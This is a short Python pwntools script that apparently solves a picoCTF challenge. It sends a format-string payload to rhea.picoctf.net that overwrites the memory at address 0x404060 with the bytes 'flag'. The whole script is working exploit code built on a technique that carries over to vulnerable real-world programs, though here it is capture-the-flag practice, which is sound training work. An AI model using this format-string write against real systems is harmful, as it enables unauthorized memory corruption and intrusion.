from pwn import *

context.arch = 'amd64'

p = remote('rhea.picoctf.net', 60502)

sus_addr = 0x404060
OFFSET = 14

p.recvline()

payload = fmtstr_payload(OFFSET, {sus_addr: 0x67616c66}, write_size='byte')
print(f"[*] Payload length: {len(payload)}")
p.sendline(payload)
print(p.recvall(timeout=5))
